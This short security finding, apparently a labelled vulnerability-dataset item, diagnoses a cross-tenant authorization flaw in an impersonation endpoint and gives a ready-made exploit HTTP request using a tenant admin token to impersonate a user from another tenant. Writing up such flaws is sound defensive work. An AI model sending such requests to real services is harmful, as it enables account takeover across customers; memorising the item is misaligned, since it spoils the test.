diagnosis: TenantAdminImpersonateUserView verifies that the requesting user is a tenant administrator for tenant_id, but subsequently queries User.objects.get(id=target_user_id) globally without verifying that target_user belongs to tenant_id. A tenant admin can impersonate users, managers, and executives belonging to completely unrelated tenants.
exploit_request:
POST /api/tenants/42/impersonate/ HTTP/1.1
Host: api.multitenant-saas.com
Authorization: Bearer tenant42_admin_jwt
Content-Type: application/json

{
  "target_user_id": 912
}
